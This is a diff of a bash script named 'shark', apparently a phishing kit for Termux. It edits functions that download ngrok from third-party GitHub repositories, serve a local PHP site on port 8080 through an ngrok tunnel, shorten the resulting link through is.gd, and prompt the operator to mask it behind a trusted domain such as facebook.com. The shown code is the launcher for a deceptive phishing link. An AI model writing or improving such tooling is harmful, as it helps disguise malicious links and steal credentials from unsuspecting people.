@@ -117,8 +117,6 @@ function os () {
 		shark="${PREFIX}/share/shark"
                 old_shark="${PREFIX}/bin/shark"
 		OS=TERMUX
-                export user=$HOME
-                authtoken
 	fi
 }
 
@@ -223,7 +221,7 @@ function fix_ngrok() {
 	launch="fixing ngrok"
 	splashdown="fixed ngrok";echo
 	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			ngrok_url="https://github.com/tech2gamer/stuff/raw/main/ngrok-2in1.zip"
+			ngrok_url="https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip"
 		elif [[ "$arch" == *'aarch64'* ]]; then
 			ngrok_url="https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip"
 		elif [[ "$arch" == *'x86_64'* ]]; then
@@ -336,9 +334,8 @@ function url_checker() {
 
 # URL_SHORTNER
 function url_shortner() {	
-	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
-	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
-	short=$(curl -s https://soo.gd/api.php?url=${ngrok_url})
+	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
+        short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${ngrok_url})
         shorter=${short#https://}       
         read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
         url_checker $mask	
@@ -349,35 +346,10 @@ function url_shortner() {
 	printf "$final_url\n"
 }
 
+
 # MAIN 
 function main() {
-HOST="127.0.0.1"
-echo
-read -p $'\e[1;32m\e[96m Do You want to enter port?\e[1;91m (Y/N):' drk
-if [[ $drk == y || $drk == Y ]]; then
-echo ""
-read -p $'\e[1;32m\e[96m Please Enter Your Port \e[1;92mEx.3246: \e[0m' PORT
-
-if [[ -z "$PORT" ]]; then
-echo
-echo -e ${red}"Bro you didn't mentioned anything."
-echo
-echo -e ${green}"restarting your option No.$option...."
-sleep 2
-main
-fi
-launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
-elif [[ $drk == n || $drk == N ]]; then
-PORT="8080"
-launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
-else
-	echo
-	echo -e ${red}"bro you type wrong..."
-	sleep 2
-	main
-fi
-
-#launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
+        HOST="127.0.0.1" ; PORT="8080" ; launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
 }
 
 #banner2
@@ -389,14 +361,11 @@ banner2() {
         ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
         ╚════════════════════════════════════╝
      
-        Author    : ${white}Ashish Singh${green}
+        Author    : ${white}Ashish Singh${green}                 
         Github    : ${white}github.com/Bhaviktutorials${green}   
-        Publisher : ${white}Bhavik Oza${green}  
-	Reborn by : ${white}@tech2.gamer${green}
+        Publisher : ${white}Bhavik Oza${green}                   
      
-        >> ${white}${final_url}${green} 
-                	or
-	>> ${white}${ngrok_url}${green} \n
+        >> ${white}${final_url}${green} \n
 \e[38;5;214m ░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;34m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;92m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓${green}\n\n"	
 }
 
